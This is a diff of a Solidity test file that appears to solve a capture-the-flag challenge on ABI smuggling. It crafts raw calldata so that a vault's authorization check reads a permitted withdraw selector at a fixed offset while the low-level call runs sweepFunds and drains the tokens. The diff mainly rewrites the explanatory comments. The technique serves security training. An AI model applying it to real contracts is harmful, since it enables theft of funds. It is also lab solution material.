@@ -85,30 +85,35 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        //these bytes contain the abi needed to call sweepfunds
+        //sweep data contains the abi encoded calldata for sweepfunds
         bytes memory sweepData = abi.encodeCall(
             vault.sweepFunds,
             (recovery, IERC20(address(token)))
         );
-        //execute selects the selector starting from the 100 byte
-        // but call runs the bytes from where the offset points
+
+        //Authorized Vault's extracts the selector using fixed calldata offset for authorization
+        // But actual low level call runs at the ABI specified Offset
+
+        // We craft calldata so the authorization check sees the permitted withdraw selector at byte offset 100, while actionData contains the sweepFunds calldata.
 
         bytes memory rawCallData = bytes.concat(
-            //this call the execute function at the target address
-            bytes4(0x1cff79cd),
-            //address of target which i want execute to work with
-            bytes32(uint256(uint160(address(vault)))),
-            //we offset to 0x80(128) where the length of dynamic argument is stored
-            
+            //first we construct the outer call data
 
+            //Selector for execute(address,bytes)
+            bytes4(0x1cff79cd),
+            //target contract address passed to execute
+            bytes32(uint256(uint160(address(vault)))),
+            // we set the ABI offset to 0x80 which points to absolute caldata byte offset 132 where dynamic length of inner calldata
             bytes32(uint256(0x80)),
-            //we pad the next 32 bytes
+            //  The following code which is part of crafting the rawCallData written in this manner because we want execute to extract a permitted operation while lowlevel call performs sweepFunds operation
+
+            //we pad the next 32 bytes and then at byte offset100 place the The permitted 4-byte withdraw selector which is used to extract the action id used in validation
             bytes32(0),
-            // we put the first 4 bytes of withdraw selector which we are permitted to run at start followed by 28 zeroes
+            // The 4-byte withdraw selector, left-aligned in a 32-byte word, at absolute calldata offset 100.
             bytes32(uint256(uint32(0xd9caed12)) << 224),
-            // the bytes that store the length of dynmaic arguments and offset points to
+            // Length of the dynamic actionData payload
             bytes32(uint256(sweepData.length)),
-            //the bytes at which the actual dynamic  arguments are stored
+            //Actual actionData payload begins here, containing the sweepFunds selector and arguments.
             sweepData
         );
         (bool success, ) = address(vault).call(rawCallData);
